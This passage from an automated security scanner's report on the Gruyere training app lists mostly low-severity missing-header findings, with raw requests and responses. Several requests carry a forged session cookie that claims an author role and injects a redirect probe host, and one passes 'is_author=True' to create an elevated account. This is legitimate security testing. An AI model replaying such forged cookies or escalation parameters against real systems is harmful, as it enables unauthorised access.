    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 2944
    content-type: text/html
    date: Sat, 03 Oct 2026 01:34:08 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: af237dcbd0daf3542090a5904257f176
    x-xss-protection: 0
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <!-- Copyright 2017 Google Inc. -->
    <html>
    <head>
    <title>Gruyere: Login</title>
    <style>
    /* Copyright 2017 Google Inc. */
    
    body, html, td, span, div, input, textarea {
      font-family: sans-serif;
      font-size: 14pt;
    }
    ... [159 more lines, 2943 chars total]
  elapsed_ms: 311.9
  --- RAW REQUEST req-3681f5b8 (exactly as issued by the engine) ---
  GET /530506698111053146050861906974275631884/login?uid=1&pw=1
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 3835
    content-type: text/html
    date: Sat, 03 Oct 2026 01:34:22 GMT
    expires: Sat, 03 Oct 2026 01:34:22 GMT
    pragma: no-cache
    server: Google Frontend
    set-cookie: GRUYERE=100416652|1||author; path=/530506698111053146050861906974275631884
    x-cloud-trace-context: bc0982e3ee17d8aabfaee7791d5d7a70
    x-xss-protection: 0
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <!-- Copyright 2017 Google Inc. -->
    <html>
    <head>
    <title>Gruyere: Home</title>
    <style>
    /* Copyright 2017 Google Inc. */
    
    body, html, td, span, div, input, textarea {
      font-family: sans-serif;
      font-size: 14pt;
    }
    ... [192 more lines, 3834 chars total]
  elapsed_ms: 312.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/login as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F18] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/newaccount.gtl (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-da2a633e (exactly as issued by the engine) ---
  GET /530506698111053146050861906974275631884/newaccount.gtl
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 3314
    content-type: text/html
    date: Sat, 03 Oct 2026 01:34:09 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: b5a73253fc8114a87fe48fd57d928dcc
    x-xss-protection: 0
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <!-- Copyright 2017 Google Inc. -->
    <html>
    <head>
    <title>Gruyere: Profile</title>
    <style>
    /* Copyright 2017 Google Inc. */
    
    body, html, td, span, div, input, textarea {
      font-family: sans-serif;
      font-size: 14pt;
    }
    ... [171 more lines, 3312 chars total]
  elapsed_ms: 329.6
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/newaccount.gtl as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F19] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/snippets.gtl (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-1403123e (exactly as issued by the engine) ---
  GET /530506698111053146050861906974275631884/snippets.gtl?uid=brie
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 3412
    content-type: text/html
    date: Sat, 03 Oct 2026 01:34:10 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 64d29204294bc7a298b9241627cf36d2
    x-xss-protection: 0
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <!-- Copyright 2017 Google Inc. -->
    <html>
    <head>
    <title>Gruyere: Snippets</title>
    <style>
    /* Copyright 2017 Google Inc. */
    
    body, html, td, span, div, input, textarea {
      font-family: sans-serif;
      font-size: 14pt;
    }
    ... [181 more lines, 3411 chars total]
  elapsed_ms: 356.6
  --- RAW REQUEST req-12f68e8d (exactly as issued by the engine) ---
  GET /530506698111053146050861906974275631884/snippets.gtl
  headers:
    Cookie: GRUYERE=59052512|//sentinel-redirect-check.example.org/probe||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 3080
    content-type: text/html
    date: Sat, 03 Oct 2026 01:35:07 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: f8dccaca520ac10a819eb44db01fcb49
    x-xss-protection: 0
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <!-- Copyright 2017 Google Inc. -->
    <html>
    <head>
    <title>Gruyere: Snippets</title>
    <style>
    /* Copyright 2017 Google Inc. */
    
    body, html, td, span, div, input, textarea {
      font-family: sans-serif;
      font-size: 14pt;
    }
    ... [167 more lines, 3079 chars total]
  elapsed_ms: 376.1
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/snippets.gtl as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F20] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/saveprofile (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-3aa76ea0 (exactly as issued by the engine) ---
  GET /530506698111053146050861906974275631884/saveprofile?action=new&uid=1&pw=1&is_author=True
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 2581
    content-type: text/html
    date: Sat, 03 Oct 2026 01:34:34 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: dcd006d371a9075e0d6d2d23cb862f86
    x-xss-protection: 0
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <!-- Copyright 2017 Google Inc. -->
    <html>
    <head>
    <title>Gruyere: Error</title>
    <style>
    /* Copyright 2017 Google Inc. */
    
    body, html, td, span, div, input, textarea {
      font-family: sans-serif;
      font-size: 14pt;
    }
    ... [143 more lines, 2580 chars total]
  elapsed_ms: 307.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/saveprofile as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F21] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/0 (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-da16ab41 (exactly as issued by the engine) ---
  GET /0
  headers:
    Cookie: GRUYERE=59052512|//sentinel-redirect-check.example.org/probe||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 359
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:35:01 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: e6bb979807e4d99bce244c54106c5bee
  body:
        <HTML>
      <STYLE>
      body, th, td, form {
        font-family: Verdana, Arial, Helvetica, sans-serif;
        font-size: 12px;
      }
      h1 { color: #dd0000; }
      </STYLE>
        <TITLE>Gruyere Error</TITLE>
        <BODY>
        <H1>Gruyere Error</H1>
        That instance does not exist.
    ... [3 more lines, 358 chars total]
  elapsed_ms: 249.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/0 as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F22] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/1 (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-5a94e9e4 (exactly as issued by the engine) ---
  GET /1
  headers:
    Cookie: GRUYERE=59052512|//sentinel-redirect-check.example.org/probe||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 359
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:35:02 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 7916b797fcfce42fcea75448350dda94
  body:
        <HTML>
      <STYLE>
      body, th, td, form {
        font-family: Verdana, Arial, Helvetica, sans-serif;
        font-size: 12px;
      }
      h1 { color: #dd0000; }
      </STYLE>
        <TITLE>Gruyere Error</TITLE>
        <BODY>
        <H1>Gruyere Error</H1>
        That instance does not exist.
    ... [3 more lines, 358 chars total]
  elapsed_ms: 245.0
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/1 as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F23] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/2 (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-8b24eccb (exactly as issued by the engine) ---
  GET /2
  headers:
    Cookie: GRUYERE=59052512|//sentinel-redirect-check.example.org/probe||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 359
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:35:02 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: f83faa7f6658675d5c0914a0b3f02706
  body:
        <HTML>
      <STYLE>
      body, th, td, form {
        font-family: Verdana, Arial, Helvetica, sans-serif;
        font-size: 12px;
      }
      h1 { color: #dd0000; }
      </STYLE>
        <TITLE>Gruyere Error</TITLE>
        <BODY>
        <H1>Gruyere Error</H1>
        That instance does not exist.
    ... [3 more lines, 358 chars total]
  elapsed_ms: 241.8
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/2 as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F24] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/3 (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-a62f2af3 (exactly as issued by the engine) ---
  GET /3
  headers:
    Cookie: GRUYERE=59052512|//sentinel-redirect-check.example.org/probe||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 359
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:35:03 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 0baa8a86a52d14c6244557d13cda94e7
  body:
        <HTML>
      <STYLE>
      body, th, td, form {
        font-family: Verdana, Arial, Helvetica, sans-serif;
        font-size: 12px;
      }
      h1 { color: #dd0000; }
      </STYLE>
        <TITLE>Gruyere Error</TITLE>
        <BODY>
        <H1>Gruyere Error</H1>
        That instance does not exist.
    ... [3 more lines, 358 chars total]
  elapsed_ms: 238.1
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/3 as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F25] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/4 (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-972f09bd (exactly as issued by the engine) ---
  GET /4
  headers:
    Cookie: GRUYERE=59052512|//sentinel-redirect-check.example.org/probe||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 359
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:35:03 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: c3ea4764f8ee2ee840c2c7babeeafeb0
  body:
        <HTML>
      <STYLE>
      body, th, td, form {
        font-family: Verdana, Arial, Helvetica, sans-serif;
        font-size: 12px;
      }
      h1 { color: #dd0000; }
      </STYLE>
        <TITLE>Gruyere Error</TITLE>
        <BODY>
        <H1>Gruyere Error</H1>
        That instance does not exist.
    ... [3 more lines, 358 chars total]
  elapsed_ms: 235.6
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/4 as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F26] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/5 (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-710311e2 (exactly as issued by the engine) ---
  GET /5
  headers:
    Cookie: GRUYERE=59052512|//sentinel-redirect-check.example.org/probe||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 359
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:35:04 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: fc8816dbe15f034c57a4a6302a466e6b
  body:
        <HTML>
      <STYLE>
      body, th, td, form {
        font-family: Verdana, Arial, Helvetica, sans-serif;
        font-size: 12px;
      }
      h1 { color: #dd0000; }
      </STYLE>
        <TITLE>Gruyere Error</TITLE>
        <BODY>
        <H1>Gruyere Error</H1>
        That instance does not exist.
    ... [3 more lines, 358 chars total]
  elapsed_ms: 236.0
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/5 as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F27] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/6 (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-bec487c0 (exactly as issued by the engine) ---
  GET /6
  headers:
    Cookie: GRUYERE=59052512|//sentinel-redirect-check.example.org/probe||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 359
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:35:04 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: df2c3ec619f81942755e5298227193b6
  body:
        <HTML>
      <STYLE>
      body, th, td, form {
        font-family: Verdana, Arial, Helvetica, sans-serif;
        font-size: 12px;
      }
      h1 { color: #dd0000; }
      </STYLE>
        <TITLE>Gruyere Error</TITLE>
        <BODY>
        <H1>Gruyere Error</H1>
        That instance does not exist.
    ... [3 more lines, 358 chars total]
  elapsed_ms: 259.4
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/6 as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F28] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/7 (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-687bb4e5 (exactly as issued by the engine) ---
  GET /7
  headers:
    Cookie: GRUYERE=59052512|//sentinel-redirect-check.example.org/probe||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 359
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:35:05 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 239255d33ffd5f3e5024d5f89cb4e4b9
  body:
        <HTML>
      <STYLE>
      body, th, td, form {
        font-family: Verdana, Arial, Helvetica, sans-serif;
        font-size: 12px;
      }
      h1 { color: #dd0000; }
      </STYLE>
        <TITLE>Gruyere Error</TITLE>
        <BODY>
        <H1>Gruyere Error</H1>
        That instance does not exist.
    ... [3 more lines, 358 chars total]
  elapsed_ms: 249.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/7 as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F29] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/8 (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-6df4a6e7 (exactly as issued by the engine) ---
  GET /8
  headers:
    Cookie: GRUYERE=59052512|//sentinel-redirect-check.example.org/probe||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 359
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:35:05 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 14edbfdba634be80ead6af790e2b6768
  body:
        <HTML>
      <STYLE>
      body, th, td, form {
        font-family: Verdana, Arial, Helvetica, sans-serif;
        font-size: 12px;
      }
      h1 { color: #dd0000; }
      </STYLE>
        <TITLE>Gruyere Error</TITLE>
        <BODY>
        <H1>Gruyere Error</H1>
        That instance does not exist.
    ... [3 more lines, 358 chars total]
  elapsed_ms: 246.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/8 as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F30] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/9 (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-62435002 (exactly as issued by the engine) ---
  GET /9
  headers:
    Cookie: GRUYERE=59052512|//sentinel-redirect-check.example.org/probe||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 359
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:35:06 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 93a6819987fcbedbe410883e07e23b61
  body:
        <HTML>
      <STYLE>
      body, th, td, form {
        font-family: Verdana, Arial, Helvetica, sans-serif;
        font-size: 12px;
      }
      h1 { color: #dd0000; }
      </STYLE>
        <TITLE>Gruyere Error</TITLE>
        <BODY>
        <H1>Gruyere Error</H1>
        That instance does not exist.
    ... [3 more lines, 358 chars total]
  elapsed_ms: 249.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/9 as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F31] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/resetbutton (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-bac58002 (exactly as issued by the engine) ---
  GET /resetbutton
  headers:
    Cookie: GRUYERE=59052512|//sentinel-redirect-check.example.org/probe||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 404
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    content-length: 52
    content-type: text/plain; charset=UTF-8
    date: Sat, 03 Oct 2026 01:35:06 GMT
    server: Google Frontend
    x-cloud-trace-context: f87e98c7b7956722c2331b47ffb22b63
  body:
    404 Not Found
    
    The resource could not be found.
    
       
  elapsed_ms: 232.4
- Evidence-OS reproduction recipe:
